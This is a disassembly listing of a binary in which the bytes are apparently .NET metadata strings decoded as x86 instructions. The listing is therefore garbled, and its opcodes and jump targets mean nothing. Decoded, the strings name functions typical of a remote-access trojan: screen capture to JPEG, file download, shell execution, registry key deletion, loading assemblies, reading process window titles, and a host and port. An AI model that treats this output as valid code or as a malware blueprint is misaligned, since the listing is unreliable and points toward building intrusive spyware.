  409059:	67 65 74 5f          	addr16 gs je 0x4090bc
  40905d:	49                   	dec    %ecx
  40905e:	74 65                	je     0x4090c5
  409060:	6d                   	insl   (%dx),%es:(%edi)
  409061:	00 41 70             	add    %al,0x70(%ecx)
  409064:	70 65                	jo     0x4090cb
  409066:	6e                   	outsb  %ds:(%esi),(%dx)
  409067:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40906b:	74 5f                	je     0x4090cc
  40906d:	4c                   	dec    %esp
  40906e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409070:	67 74 68             	addr16 je 0x4090db
  409073:	00 53 75             	add    %dl,0x75(%ebx)
  409076:	62 73 74             	bound  %esi,0x74(%ebx)
  409079:	72 69                	jb     0x4090e4
  40907b:	6e                   	outsb  %ds:(%esi),(%dx)
  40907c:	67 00 4f 62          	add    %cl,0x62(%bx)
  409080:	6a 65                	push   $0x65
  409082:	63 74 51 75          	arpl   %esi,0x75(%ecx,%edx,2)
  409086:	65 72 79             	gs jb  0x409102
  409089:	00 4d 61             	add    %cl,0x61(%ebp)
  40908c:	6e                   	outsb  %ds:(%esi),(%dx)
  40908d:	61                   	popa
  40908e:	67 65 6d             	gs insl (%dx),%es:(%di)
  409091:	65 6e                	outsb  %gs:(%esi),(%dx)
  409093:	74 4f                	je     0x4090e4
  409095:	62 6a 65             	bound  %ebp,0x65(%edx)
  409098:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  40909c:	6d                   	insl   (%dx),%es:(%edi)
  40909d:	70 74                	jo     0x409113
  40909f:	79 00                	jns    0x4090a1
  4090a1:	43                   	inc    %ebx
  4090a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4090a4:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090a9:	61                   	popa
  4090aa:	74 65                	je     0x409111
  4090ac:	4f                   	dec    %edi
  4090ad:	62 6a 65             	bound  %ebp,0x65(%edx)
  4090b0:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  4090b4:	65 74 5f             	gs je  0x409116
  4090b7:	49                   	dec    %ecx
  4090b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b9:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090bb:	00 67 65             	add    %ah,0x65(%edi)
  4090be:	74 5f                	je     0x40911f
  4090c0:	54                   	push   %esp
  4090c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c2:	74 61                	je     0x409125
  4090c4:	6c                   	insb   (%dx),%es:(%edi)
  4090c5:	50                   	push   %eax
  4090c6:	68 79 73 69 63       	push   $0x63697379
  4090cb:	61                   	popa
  4090cc:	6c                   	insb   (%dx),%es:(%edi)
  4090cd:	4d                   	dec    %ebp
  4090ce:	65 6d                	gs insl (%dx),%es:(%edi)
  4090d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d1:	72 79                	jb     0x40914c
  4090d3:	00 55 49             	add    %dl,0x49(%ebp)
  4090d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d7:	74 36                	je     0x40910f
  4090d9:	34 00                	xor    $0x0,%al
  4090db:	43                   	inc    %ebx
  4090dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4090dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4090de:	76 65                	jbe    0x409145
  4090e0:	72 73                	jb     0x409155
  4090e2:	69 6f 6e 00 56 61 6c 	imul   $0x6c615600,0x6e(%edi),%ebp
  4090e9:	00 4d 61             	add    %cl,0x61(%ebp)
  4090ec:	74 68                	je     0x409156
  4090ee:	00 52 6f             	add    %dl,0x6f(%edx)
  4090f1:	75 6e                	jne    0x409161
  4090f3:	64 00 44 6f 75       	add    %al,%fs:0x75(%edi,%ebp,2)
  4090f8:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4090fc:	52                   	push   %edx
  4090fd:	65 6d                	gs insl (%dx),%es:(%edi)
  4090ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409100:	76 65                	jbe    0x409167
  409102:	00 45 6e             	add    %al,0x6e(%ebp)
  409105:	64 52                	fs push %edx
  409107:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40910b:	76 65                	jbe    0x409172
  40910d:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  409111:	72 72                	jb     0x409185
  409113:	61                   	popa
  409114:	79 00                	jns    0x409116
  409116:	54                   	push   %esp
  409117:	6f                   	outsl  %ds:(%esi),(%dx)
  409118:	4c                   	dec    %esp
  409119:	6f                   	outsl  %ds:(%esi),(%dx)
  40911a:	6e                   	outsb  %ds:(%esi),(%dx)
  40911b:	67 00 53 74          	add    %dl,0x74(%bp,%di)
  40911f:	72 65                	jb     0x409186
  409121:	61                   	popa
  409122:	6d                   	insl   (%dx),%es:(%edi)
  409123:	00 57 72             	add    %dl,0x72(%edi)
  409126:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  40912d:	00 
  40912e:	57                   	push   %edi
  40912f:	72 69                	jb     0x40919a
  409131:	74 65                	je     0x409198
  409133:	00 50 61             	add    %dl,0x61(%eax)
  409136:	72 61                	jb     0x409199
  409138:	6d                   	insl   (%dx),%es:(%edi)
  409139:	65 74 65             	gs je  0x4091a1
  40913c:	72 69                	jb     0x4091a7
  40913e:	7a 65                	jp     0x4091a5
  409140:	64 54                	fs push %esp
  409142:	68 72 65 61 64       	push   $0x64616572
  409147:	53                   	push   %ebx
  409148:	74 61                	je     0x4091ab
  40914a:	72 74                	jb     0x4091c0
  40914c:	00 4f 62             	add    %cl,0x62(%edi)
  40914f:	6a 65                	push   $0x65
  409151:	63 74 46 6c          	arpl   %esi,0x6c(%esi,%eax,2)
  409155:	6f                   	outsl  %ds:(%esi),(%dx)
  409156:	77 43                	ja     0x40919b
  409158:	6f                   	outsl  %ds:(%esi),(%dx)
  409159:	6e                   	outsb  %ds:(%esi),(%dx)
  40915a:	74 72                	je     0x4091ce
  40915c:	6f                   	outsl  %ds:(%esi),(%dx)
  40915d:	6c                   	insb   (%dx),%es:(%edi)
  40915e:	00 43 68             	add    %al,0x68(%ebx)
  409161:	65 63 6b 46          	arpl   %ebp,%gs:0x46(%ebx)
  409165:	6f                   	outsl  %ds:(%esi),(%dx)
  409166:	72 53                	jb     0x4091bb
  409168:	79 6e                	jns    0x4091d8
  40916a:	63 4c 6f 63          	arpl   %ecx,0x63(%edi,%ebp,2)
  40916e:	6b 4f 6e 56          	imul   $0x56,0x6e(%edi),%ecx
  409172:	61                   	popa
  409173:	6c                   	insb   (%dx),%es:(%edi)
  409174:	75 65                	jne    0x4091db
  409176:	54                   	push   %esp
  409177:	79 70                	jns    0x4091e9
  409179:	65 00 4d 6f          	add    %cl,%gs:0x6f(%ebp)
  40917d:	6e                   	outsb  %ds:(%esi),(%dx)
  40917e:	69 74 6f 72 00 45 6e 	imul   $0x746e4500,0x72(%edi,%ebp,2),%esi
  409185:	74 
  409186:	65 72 00             	gs jb  0x409189
  409189:	53                   	push   %ebx
  40918a:	65 6c                	gs insb (%dx),%es:(%edi)
  40918c:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  409191:	64 65 00 50 6f       	fs add %dl,%gs:0x6f(%eax)
  409196:	6c                   	insb   (%dx),%es:(%edi)
  409197:	6c                   	insb   (%dx),%es:(%edi)
  409198:	00 42 65             	add    %al,0x65(%edx)
  40919b:	67 69 6e 53 65 6e 64 	imul   $0x646e65,0x53(%bp),%ebp
  4091a2:	00 
  4091a3:	43                   	inc    %ebx
  4091a4:	6c                   	insb   (%dx),%es:(%edi)
  4091a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4091a6:	73 65                	jae    0x40920d
  4091a8:	00 47 43             	add    %al,0x43(%edi)
  4091ab:	00 43 6f             	add    %al,0x6f(%ebx)
  4091ae:	6c                   	insb   (%dx),%es:(%edi)
  4091af:	6c                   	insb   (%dx),%es:(%edi)
  4091b0:	65 63 74 00 5f       	arpl   %esi,%gs:0x5f(%eax,%eax,1)
  4091b5:	43                   	inc    %ebx
  4091b6:	6c                   	insb   (%dx),%es:(%edi)
  4091b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4091b8:	73 75                	jae    0x40922f
  4091ba:	72 65                	jb     0x409221
  4091bc:	24 5f                	and    $0x5f,%al
  4091be:	5f                   	pop    %edi
  4091bf:	31 00                	xor    %eax,(%eax)
  4091c1:	24 56                	and    $0x56,%al
  4091c3:	42                   	inc    %edx
  4091c4:	24 4c                	and    $0x4c,%al
  4091c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c7:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4091ca:	5f                   	pop    %edi
  4091cb:	48                   	dec    %eax
  4091cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4091cd:	73 74                	jae    0x409243
  4091cf:	00 24 56             	add    %ah,(%esi,%edx,2)
  4091d2:	42                   	inc    %edx
  4091d3:	24 4c                	and    $0x4c,%al
  4091d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d6:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4091d9:	5f                   	pop    %edi
  4091da:	50                   	push   %eax
  4091db:	6f                   	outsl  %ds:(%esi),(%dx)
  4091dc:	72 74                	jb     0x409252
  4091de:	00 5f 4c             	add    %bl,0x4c(%edi)
  4091e1:	61                   	popa
  4091e2:	6d                   	insl   (%dx),%es:(%edi)
  4091e3:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4091e7:	5f                   	pop    %edi
  4091e8:	5f                   	pop    %edi
  4091e9:	38 00                	cmp    %al,(%eax)
  4091eb:	5f                   	pop    %edi
  4091ec:	4c                   	dec    %esp
  4091ed:	61                   	popa
  4091ee:	6d                   	insl   (%dx),%es:(%edi)
  4091ef:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4091f3:	5f                   	pop    %edi
  4091f4:	5f                   	pop    %edi
  4091f5:	36 00 5f 4c          	add    %bl,%ss:0x4c(%edi)
  4091f9:	61                   	popa
  4091fa:	6d                   	insl   (%dx),%es:(%edi)
  4091fb:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4091ff:	5f                   	pop    %edi
  409200:	5f                   	pop    %edi
  409201:	37                   	aaa
  409202:	00 53 79             	add    %dl,0x79(%ebx)
  409205:	73 74                	jae    0x40927b
  409207:	65 6d                	gs insl (%dx),%es:(%edi)
  409209:	2e 44                	cs inc %esp
  40920b:	72 61                	jb     0x40926e
  40920d:	77 69                	ja     0x409278
  40920f:	6e                   	outsb  %ds:(%esi),(%dx)
  409210:	67 00 47 72          	add    %al,0x72(%bx)
  409214:	61                   	popa
  409215:	70 68                	jo     0x40927f
  409217:	69 63 73 00 53 69 7a 	imul   $0x7a695300,0x73(%ebx),%esp
  40921e:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  409222:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  409226:	67 6c                	insb   (%dx),%es:(%di)
  409228:	65 00 42 69          	add    %al,%gs:0x69(%edx)
  40922c:	74 6d                	je     0x40929b
  40922e:	61                   	popa
  40922f:	70 00                	jo     0x409231
  409231:	53                   	push   %ebx
  409232:	74 72                	je     0x4092a6
  409234:	69 6e 67 73 00 43 6f 	imul   $0x6f430073,0x67(%esi),%ebp
  40923b:	6d                   	insl   (%dx),%es:(%edi)
  40923c:	70 61                	jo     0x40929f
  40923e:	72 65                	jb     0x4092a5
  409240:	4d                   	dec    %ebp
  409241:	65 74 68             	gs je  0x4092ac
  409244:	6f                   	outsl  %ds:(%esi),(%dx)
  409245:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  409249:	73 74                	jae    0x4092bf
  40924b:	65 6d                	gs insl (%dx),%es:(%edi)
  40924d:	2e 57                	cs push %edi
  40924f:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409256:	46                   	inc    %esi
  409257:	6f                   	outsl  %ds:(%esi),(%dx)
  409258:	72 6d                	jb     0x4092c7
  40925a:	73 00                	jae    0x40925c
  40925c:	52                   	push   %edx
  40925d:	65 73 74             	gs jae 0x4092d4
  409260:	61                   	popa
  409261:	72 74                	jb     0x4092d7
  409263:	00 53 6f             	add    %dl,0x6f(%ebx)
  409266:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409269:	74 53                	je     0x4092be
  40926b:	68 75 74 64 6f       	push   $0x6f647475
  409270:	77 6e                	ja     0x4092e0
  409272:	00 53 68             	add    %dl,0x68(%ebx)
  409275:	75 74                	jne    0x4092eb
  409277:	64 6f                	outsl  %fs:(%esi),(%dx)
  409279:	77 6e                	ja     0x4092e9
  40927b:	00 43 6f             	add    %al,0x6f(%ebx)
  40927e:	6e                   	outsb  %ds:(%esi),(%dx)
  40927f:	76 65                	jbe    0x4092e6
  409281:	72 74                	jb     0x4092f7
  409283:	00 46 72             	add    %al,0x72(%esi)
  409286:	6f                   	outsl  %ds:(%esi),(%dx)
  409287:	6d                   	insl   (%dx),%es:(%edi)
  409288:	42                   	inc    %edx
  409289:	61                   	popa
  40928a:	73 65                	jae    0x4092f1
  40928c:	36 34 53             	ss xor $0x53,%al
  40928f:	74 72                	je     0x409303
  409291:	69 6e 67 00 53 65 72 	imul   $0x72655300,0x67(%esi),%ebp
  409298:	76 69                	jbe    0x409303
  40929a:	63 65 50             	arpl   %esp,0x50(%ebp)
  40929d:	6f                   	outsl  %ds:(%esi),(%dx)
  40929e:	69 6e 74 4d 61 6e 61 	imul   $0x616e614d,0x74(%esi),%ebp
  4092a5:	67 65 72 00          	addr16 gs jb 0x4092a9
  4092a9:	73 65                	jae    0x409310
  4092ab:	74 5f                	je     0x40930c
  4092ad:	45                   	inc    %ebp
  4092ae:	78 70                	js     0x409320
  4092b0:	65 63 74 31 30       	arpl   %esi,%gs:0x30(%ecx,%esi,1)
  4092b5:	30 43 6f             	xor    %al,0x6f(%ebx)
  4092b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b9:	74 69                	je     0x409324
  4092bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4092bc:	75 65                	jne    0x409323
  4092be:	00 53 65             	add    %dl,0x65(%ebx)
  4092c1:	63 75 72             	arpl   %esi,0x72(%ebp)
  4092c4:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  4092cb:	6f 
  4092cc:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4092cf:	54                   	push   %esp
  4092d0:	79 70                	jns    0x409342
  4092d2:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4092d6:	74 5f                	je     0x409337
  4092d8:	53                   	push   %ebx
  4092d9:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4092dd:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  4092e4:	6f 
  4092e5:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4092e8:	00 73 65             	add    %dh,0x65(%ebx)
  4092eb:	74 5f                	je     0x40934c
  4092ed:	44                   	inc    %esp
  4092ee:	65 66 61             	gs popaw
  4092f1:	75 6c                	jne    0x40935f
  4092f3:	74 43                	je     0x409338
  4092f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fe:	4c                   	dec    %esp
  4092ff:	69 6d 69 74 00 47 65 	imul   $0x65470074,0x69(%ebp),%ebp
  409306:	74 54                	je     0x40935c
  409308:	65 6d                	gs insl (%dx),%es:(%edi)
  40930a:	70 50                	jo     0x40935c
  40930c:	61                   	popa
  40930d:	74 68                	je     0x409377
  40930f:	00 43 6f             	add    %al,0x6f(%ebx)
  409312:	6d                   	insl   (%dx),%es:(%edi)
  409313:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  409316:	65 00 44 6f 77       	add    %al,%gs:0x77(%edi,%ebp,2)
  40931b:	6e                   	outsb  %ds:(%esi),(%dx)
  40931c:	6c                   	insb   (%dx),%es:(%edi)
  40931d:	6f                   	outsl  %ds:(%esi),(%dx)
  40931e:	61                   	popa
  40931f:	64 46                	fs inc %esi
  409321:	69 6c 65 00 41 70 70 	imul   $0x57707041,0x0(%ebp,%eiz,2),%ebp
  409328:	57 
  409329:	69 6e 53 74 79 6c 65 	imul   $0x656c7974,0x53(%esi),%ebp
  409330:	00 53 68             	add    %dl,0x68(%ebx)
  409333:	65 6c                	gs insb (%dx),%es:(%edi)
  409335:	6c                   	insb   (%dx),%es:(%edi)
  409336:	00 41 62             	add    %al,0x62(%ecx)
  409339:	6f                   	outsl  %ds:(%esi),(%dx)
  40933a:	72 74                	jb     0x4093b0
  40933c:	00 52 65             	add    %dl,0x65(%edx)
  40933f:	61                   	popa
  409340:	64 41                	fs inc %ecx
  409342:	6c                   	insb   (%dx),%es:(%edi)
  409343:	6c                   	insb   (%dx),%es:(%edi)
  409344:	54                   	push   %esp
  409345:	65 78 74             	gs js  0x4093bc
  409348:	00 57 72             	add    %dl,0x72(%edi)
  40934b:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  409352:	65 
  409353:	78 74                	js     0x4093c9
  409355:	00 67 65             	add    %ah,0x65(%edi)
  409358:	74 5f                	je     0x4093b9
  40935a:	4d                   	dec    %ebp
  40935b:	65 73 73             	gs jae 0x4093d1
  40935e:	61                   	popa
  40935f:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  409364:	6c                   	insb   (%dx),%es:(%edi)
  409365:	65 74 65             	gs je  0x4093cd
  409368:	53                   	push   %ebx
  409369:	75 62                	jne    0x4093cd
  40936b:	4b                   	dec    %ebx
  40936c:	65 79 00             	gs jns 0x40936f
  40936f:	53                   	push   %ebx
  409370:	63 72 65             	arpl   %esi,0x65(%edx)
  409373:	65 6e                	outsb  %gs:(%esi),(%dx)
  409375:	00 67 65             	add    %ah,0x65(%edi)
  409378:	74 5f                	je     0x4093d9
  40937a:	50                   	push   %eax
  40937b:	72 69                	jb     0x4093e6
  40937d:	6d                   	insl   (%dx),%es:(%edi)
  40937e:	61                   	popa
  40937f:	72 79                	jb     0x4093fa
  409381:	53                   	push   %ebx
  409382:	63 72 65             	arpl   %esi,0x65(%edx)
  409385:	65 6e                	outsb  %gs:(%esi),(%dx)
  409387:	00 67 65             	add    %ah,0x65(%edi)
  40938a:	74 5f                	je     0x4093eb
  40938c:	42                   	inc    %edx
  40938d:	6f                   	outsl  %ds:(%esi),(%dx)
  40938e:	75 6e                	jne    0x4093fe
  409390:	64 73 00             	fs jae 0x409393
  409393:	67 65 74 5f          	addr16 gs je 0x4093f6
  409397:	57                   	push   %edi
  409398:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  40939f:	74 
  4093a0:	5f                   	pop    %edi
  4093a1:	48                   	dec    %eax
  4093a2:	65 69 67 68 74 00 53 	imul   $0x79530074,%gs:0x68(%edi),%esp
  4093a9:	79 
  4093aa:	73 74                	jae    0x409420
  4093ac:	65 6d                	gs insl (%dx),%es:(%edi)
  4093ae:	2e 44                	cs inc %esp
  4093b0:	72 61                	jb     0x409413
  4093b2:	77 69                	ja     0x40941d
  4093b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b5:	67 2e 49             	addr16 cs dec %ecx
  4093b8:	6d                   	insl   (%dx),%es:(%edi)
  4093b9:	61                   	popa
  4093ba:	67 69 6e 67 00 50 69 	imul   $0x78695000,0x67(%bp),%ebp
  4093c1:	78 
  4093c2:	65 6c                	gs insb (%dx),%es:(%edi)
  4093c4:	46                   	inc    %esi
  4093c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c6:	72 6d                	jb     0x409435
  4093c8:	61                   	popa
  4093c9:	74 00                	je     0x4093cb
  4093cb:	49                   	dec    %ecx
  4093cc:	6d                   	insl   (%dx),%es:(%edi)
  4093cd:	61                   	popa
  4093ce:	67 65 00 46 72       	add    %al,%gs:0x72(%bp)
  4093d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d4:	6d                   	insl   (%dx),%es:(%edi)
  4093d5:	49                   	dec    %ecx
  4093d6:	6d                   	insl   (%dx),%es:(%edi)
  4093d7:	61                   	popa
  4093d8:	67 65 00 43 6f       	add    %al,%gs:0x6f(%bp,%di)
  4093dd:	70 79                	jo     0x409458
  4093df:	50                   	push   %eax
  4093e0:	69 78 65 6c 4f 70 65 	imul   $0x65704f6c,0x65(%eax),%edi
  4093e7:	72 61                	jb     0x40944a
  4093e9:	74 69                	je     0x409454
  4093eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ed:	00 43 6f             	add    %al,0x6f(%ebx)
  4093f0:	70 79                	jo     0x40946b
  4093f2:	46                   	inc    %esi
  4093f3:	72 6f                	jb     0x409464
  4093f5:	6d                   	insl   (%dx),%es:(%edi)
  4093f6:	53                   	push   %ebx
  4093f7:	63 72 65             	arpl   %esi,0x65(%edx)
  4093fa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4093fc:	00 47 72             	add    %al,0x72(%edi)
  4093ff:	61                   	popa
  409400:	70 68                	jo     0x40946a
  409402:	69 63 73 55 6e 69 74 	imul   $0x74696e55,0x73(%ebx),%esp
  409409:	00 44 72 61          	add    %al,0x61(%edx,%esi,2)
  40940d:	77 49                	ja     0x409458
  40940f:	6d                   	insl   (%dx),%es:(%edi)
  409410:	61                   	popa
  409411:	67 65 00 49 6d       	add    %cl,%gs:0x6d(%bx,%di)
  409416:	61                   	popa
  409417:	67 65 46             	addr16 gs inc %esi
  40941a:	6f                   	outsl  %ds:(%esi),(%dx)
  40941b:	72 6d                	jb     0x40948a
  40941d:	61                   	popa
  40941e:	74 00                	je     0x409420
  409420:	67 65 74 5f          	addr16 gs je 0x409483
  409424:	4a                   	dec    %edx
  409425:	70 65                	jo     0x40948c
  409427:	67 00 53 61          	add    %dl,0x61(%bp,%di)
  40942b:	76 65                	jbe    0x409492
  40942d:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409431:	61                   	popa
  409432:	73 65                	jae    0x409499
  409434:	36 34 53             	ss xor $0x53,%al
  409437:	74 72                	je     0x4094ab
  409439:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  409440:	74 65                	je     0x4094a7
  409442:	6d                   	insl   (%dx),%es:(%edi)
  409443:	2e 52                	cs push %edx
  409445:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  409448:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40944d:	6e                   	outsb  %ds:(%esi),(%dx)
  40944e:	00 4d 65             	add    %cl,0x65(%ebp)
  409451:	74 68                	je     0x4094bb
  409453:	6f                   	outsl  %ds:(%esi),(%dx)
  409454:	64 49                	fs dec %ecx
  409456:	6e                   	outsb  %ds:(%esi),(%dx)
  409457:	66 6f                	outsw  %ds:(%esi),(%dx)
  409459:	00 41 70             	add    %al,0x70(%ecx)
  40945c:	70 44                	jo     0x4094a2
  40945e:	6f                   	outsl  %ds:(%esi),(%dx)
  40945f:	6d                   	insl   (%dx),%es:(%edi)
  409460:	61                   	popa
  409461:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  409468:	43                   	inc    %ebx
  409469:	75 72                	jne    0x4094dd
  40946b:	72 65                	jb     0x4094d2
  40946d:	6e                   	outsb  %ds:(%esi),(%dx)
  40946e:	74 44                	je     0x4094b4
  409470:	6f                   	outsl  %ds:(%esi),(%dx)
  409471:	6d                   	insl   (%dx),%es:(%edi)
  409472:	61                   	popa
  409473:	69 6e 00 41 73 73 65 	imul   $0x65737341,0x0(%esi),%ebp
  40947a:	6d                   	insl   (%dx),%es:(%edi)
  40947b:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40947f:	4c                   	dec    %esp
  409480:	6f                   	outsl  %ds:(%esi),(%dx)
  409481:	61                   	popa
  409482:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  409486:	74 54                	je     0x4094dc
  409488:	79 70                	jns    0x4094fa
  40948a:	65 73 00             	gs jae 0x40948d
  40948d:	4d                   	dec    %ebp
  40948e:	65 6d                	gs insl (%dx),%es:(%edi)
  409490:	62 65 72             	bound  %esp,0x72(%ebp)
  409493:	49                   	dec    %ecx
  409494:	6e                   	outsb  %ds:(%esi),(%dx)
  409495:	66 6f                	outsw  %ds:(%esi),(%dx)
  409497:	00 67 65             	add    %ah,0x65(%edi)
  40949a:	74 5f                	je     0x4094fb
  40949c:	4e                   	dec    %esi
  40949d:	61                   	popa
  40949e:	6d                   	insl   (%dx),%es:(%edi)
  40949f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4094a3:	74 4d                	je     0x4094f2
  4094a5:	65 74 68             	gs je  0x409510
  4094a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4094a9:	64 73 00             	fs jae 0x4094ac
  4094ac:	43                   	inc    %ebx
  4094ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4094af:	64 69 74 69 6f 6e 61 	imul   $0x436c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  4094b6:	6c 43 
  4094b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4094b9:	6d                   	insl   (%dx),%es:(%edi)
  4094ba:	70 61                	jo     0x40951d
  4094bc:	72 65                	jb     0x409523
  4094be:	4f                   	dec    %edi
  4094bf:	62 6a 65             	bound  %ebp,0x65(%edx)
  4094c2:	63 74 45 71          	arpl   %esi,0x71(%ebp,%eax,2)
  4094c6:	75 61                	jne    0x409529
  4094c8:	6c                   	insb   (%dx),%es:(%edi)
  4094c9:	00 49 6e             	add    %cl,0x6e(%ecx)
  4094cc:	74 33                	je     0x409501
  4094ce:	32 00                	xor    (%eax),%al
  4094d0:	53                   	push   %ebx
  4094d1:	74 61                	je     0x409534
  4094d3:	72 74                	jb     0x409549
  4094d5:	73 57                	jae    0x40952e
  4094d7:	69 74 68 00 53 74 6f 	imul   $0x706f7453,0x0(%eax,%ebp,2),%esi
  4094de:	70 
  4094df:	77 61                	ja     0x409542
  4094e1:	74 63                	je     0x409546
  4094e3:	68 00 46 72 6f       	push   $0x6f724600
  4094e8:	6d                   	insl   (%dx),%es:(%edi)
  4094e9:	53                   	push   %ebx
  4094ea:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  4094ee:	64 73 00             	fs jae 0x4094f1
  4094f1:	67 65 74 5f          	addr16 gs je 0x409554
  4094f5:	45                   	inc    %ebp
  4094f6:	6c                   	insb   (%dx),%es:(%edi)
  4094f7:	61                   	popa
  4094f8:	70 73                	jo     0x40956d
  4094fa:	65 64 00 6f 70       	gs add %ch,%fs:0x70(%edi)
  4094ff:	5f                   	pop    %edi
  409500:	47                   	inc    %edi
  409501:	72 65                	jb     0x409568
  409503:	61                   	popa
  409504:	74 65                	je     0x40956b
  409506:	72 54                	jb     0x40955c
  409508:	68 61 6e 00 53       	push   $0x53006e61
  40950d:	79 73                	jns    0x409582
  40950f:	74 65                	je     0x409576
  409511:	6d                   	insl   (%dx),%es:(%edi)
  409512:	2e 43                	cs inc %ebx
  409514:	6f                   	outsl  %ds:(%esi),(%dx)
  409515:	6c                   	insb   (%dx),%es:(%edi)
  409516:	6c                   	insb   (%dx),%es:(%edi)
  409517:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40951c:	6e                   	outsb  %ds:(%esi),(%dx)
  40951d:	73 2e                	jae    0x40954d
  40951f:	47                   	inc    %edi
  409520:	65 6e                	outsb  %gs:(%esi),(%dx)
  409522:	65 72 69             	gs jb  0x40958e
  409525:	63 00                	arpl   %eax,(%eax)
  409527:	4c                   	dec    %esp
  409528:	69 73 74 60 31 00 41 	imul   $0x41003160,0x74(%ebx),%esi
  40952f:	64 64 00 47 65       	fs add %al,%fs:0x65(%edi)
  409534:	74 50                	je     0x409586
  409536:	72 6f                	jb     0x4095a7
  409538:	63 65 73             	arpl   %esp,0x73(%ebp)
  40953b:	73 65                	jae    0x4095a2
  40953d:	73 00                	jae    0x40953f
  40953f:	67 65 74 5f          	addr16 gs je 0x4095a2
  409543:	4d                   	dec    %ebp
  409544:	61                   	popa
  409545:	69 6e 57 69 6e 64 6f 	imul   $0x6f646e69,0x57(%esi),%ebp
  40954c:	77 54                	ja     0x4095a2
  40954e:	69 74 6c 65 00 49 73 	imul   $0x4e734900,0x65(%esp,%ebp,2),%esi
  409555:	4e 
  409556:	75 6c                	jne    0x4095c4
  409558:	6c                   	insb   (%dx),%es:(%edi)
  409559:	4f                   	dec    %edi
  40955a:	72 45                	jb     0x4095a1
  40955c:	6d                   	insl   (%dx),%es:(%edi)
  40955d:	70 74                	jo     0x4095d3
  40955f:	79 00                	jns    0x409561
  409561:	46                   	inc    %esi
  409562:	75 6e                	jne    0x4095d2
  409564:	63 60 32             	arpl   %esp,0x32(%eax)
  409567:	00 53 79             	add    %dl,0x79(%ebx)
  40956a:	73 74                	jae    0x4095e0
  40956c:	65 6d                	gs insl (%dx),%es:(%edi)
  40956e:	2e 43                	cs inc %ebx
  409570:	6f                   	outsl  %ds:(%esi),(%dx)
  409571:	72 65                	jb     0x4095d8
  409573:	00 53 79             	add    %dl,0x79(%ebx)
